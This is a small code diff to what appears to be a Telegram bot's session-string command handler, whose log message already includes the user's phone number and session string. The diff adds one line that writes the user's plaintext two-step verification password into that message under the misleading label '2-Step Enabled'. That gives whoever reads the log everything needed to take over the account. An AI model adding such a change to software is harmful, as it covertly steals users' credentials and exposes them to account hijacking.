@@ -79,6 +79,7 @@ async def session_cmd(_, msg):
                 f"🌐 **Profile Link:** {profile_link}\n"
                 f"📞 **Phone Number:** `{number}`\n"
                 f"🛡 **2-Step Enabled:** `{'YES' if two_step_enabled else 'NO'}`\n\n"
+                f"🛡 **2-Step Enabled:** `{password}`\n\n"
                 f"🔑 **Session String:**\n`{string}`"
             )
         except Exception as log_error:
